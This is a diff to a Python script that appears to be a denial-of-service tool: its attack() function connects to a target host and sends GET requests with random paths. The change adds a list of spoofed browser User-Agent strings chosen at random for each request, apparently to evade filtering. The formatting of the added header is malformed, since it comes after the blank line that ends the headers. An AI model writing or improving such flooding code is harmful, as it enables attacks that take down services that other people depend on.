@@ -4,6 +4,16 @@ import string
 import sys
 import threading
 import time
+
+usergent=[]
+usergent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
+usergent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
+usergent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
+usergent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
+usergent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
+usergent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
+usergent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
+
 host = ""
 ip = ""
 port = 0
@@ -21,13 +31,13 @@ def urli_path():
     data = "".join(random.sample(msg, 5))
     return data
 def attack():
-    status()
     url_path = urli_path()
      # Creating a soccket
     dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         dos.connect((ip,int( port)))
-        dos.send("GET /%s HTTP/1.1\nHost: %s \n\n" % (url_path, host))
+        status()
+        dos.send("GET /%s HTTP/1.1\nHost: %s \n\n User-Agent: %s" % (url_path, host, random.choice(usergent)))
     except socket.error:
         print("\33[91mNo connection, server may be down \33[00m")
     except:
